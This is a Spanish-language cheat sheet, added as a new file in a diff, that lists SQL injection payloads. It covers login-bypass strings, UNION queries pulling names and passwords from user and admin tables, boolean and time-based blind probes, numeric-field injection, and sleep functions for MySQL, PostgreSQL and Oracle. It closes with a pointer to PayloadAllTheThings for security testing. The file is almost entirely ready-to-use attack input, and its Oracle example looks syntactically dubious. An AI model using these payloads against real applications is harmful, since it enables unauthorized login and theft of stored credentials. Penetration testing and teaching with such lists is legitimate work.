@@ -1,0 +1,82 @@
+Ejemplos Comunes de Payloads de Inyección SQL
+
+    Bypass de Autenticación Básica Estos payloads se suelen usar en formularios de login para intentar acceder sin conocer la contraseña.
+
+    sql
+
+' OR '1'='1' -- 
+' OR '1'='1' #
+' OR 1=1 --
+' OR 1=1 #
+admin' -- 
+admin' #
+admin' OR '1'='1' -- 
+admin' OR '1'='1' #
+admin' OR 1=1 --
+admin' OR 1=1 #
+
+En estos ejemplos, el -- o # inicia un comentario, ignorando el resto de la consulta y permitiendo el acceso si el primer término es válido.
+
+Extracción de Datos con UNION La palabra clave UNION permite combinar el resultado de múltiples consultas. Esto puede usarse para obtener datos de otras tablas.
+
+sql
+
+' UNION SELECT 1,2,3 --
+' UNION SELECT nombre, clave FROM usuarios --
+' UNION SELECT nombre, clave, email FROM admins --
+
+Estos payloads pueden usarse en aplicaciones vulnerables para extraer información de la base de datos.
+
+Payloads Basados en Comentarios Los comentarios se utilizan para ignorar parte de la consulta original.
+
+sql
+
+admin' -- 
+admin' # 
+' OR 1=1-- 
+' OR 1=1# 
+
+Pruebas de Respuestas Booleanas Estos payloads se usan para ver si la consulta es vulnerable a inyección SQL ciega.
+
+sql
+
+' AND 1=1 --   -- Si la consulta es válida
+' AND 1=2 --   -- Si la consulta es falsa
+
+Payloads Basados en Tiempo (Time-Based) Útiles para inyección SQL ciega, introducen una demora en la respuesta.
+
+sql
+
+' OR IF(1=1, SLEEP(5), 0) -- 
+' OR IF(username = 'admin', SLEEP(5), 0) --
+
+Inyección en Campos Numéricos Si la aplicación espera un número, puedes probar sin comillas.
+
+sql
+
+1 OR 1=1
+1' OR '1'='1
+
+Bypass de Inyecciones SQL Basadas en Diferentes Bases de Datos Algunas bases de datos tienen funciones específicas. Ejemplos:
+
+    MySQL: Usa SLEEP() para inyección basada en tiempo.
+
+    sql
+
+' OR SLEEP(5) -- 
+
+PostgreSQL: Usa pg_sleep() para inyección basada en tiempo.
+
+sql
+
+' OR pg_sleep(5) --
+
+Oracle: Usa dbms_pipe.receive_message para ralentizar la respuesta.
+
+sql
+
+        ' OR 1=1; dbms_pipe.receive_message(('a'),5) --
+
+Recursos Adicionales para Payloads de Inyección SQL
+
+Existen listas de payloads de inyección SQL organizadas en repositorios como PayloadAllTheThings, que es un recurso muy completo para pruebas de seguridad.
